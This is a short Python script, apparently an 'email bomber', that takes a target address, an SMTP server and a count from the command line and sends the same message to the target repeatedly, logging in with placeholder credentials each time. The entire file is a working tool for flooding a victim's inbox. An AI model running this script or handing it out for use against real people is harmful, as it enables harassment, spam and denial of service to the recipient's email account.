from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import time
import argparse

lst = []


my_parser = argparse.ArgumentParser()

my_parser.add_argument("--num", help="Enter the email file name", default=10, type=int)
my_parser.add_argument("-target", help="Specify the targeted email address", required=True)
my_parser.add_argument("-server", help="Enter smtp server name like smtp.gmail.com", required=True)
my_parser.add_argument("--sender", help="Specify sender name", default="Bot")

args = my_parser.parse_args()

if args.target is None and args.num is None and args.server is None:
    print("Inappropriate use please refer help")

# iterating till the range
for i in range(0, args.num):
    message = MIMEMultipart()
    message["From"] = "Sender_Name"                         #your sender name
    message["To"] = args.target
    message["Subject"] = "Email_Bomber"                     #your subject
    message.attach(MIMEText("Your text messages"))
    with smtplib.SMTP(host=args.server, port=587) as smtp:
        smtp.ehlo()
        smtp.starttls()
        smtp.login("email_address", "password")
        smtp.send_message(message)
        print("Sent....")
    time.sleep(5)                                           #delay for 5 second in sending email


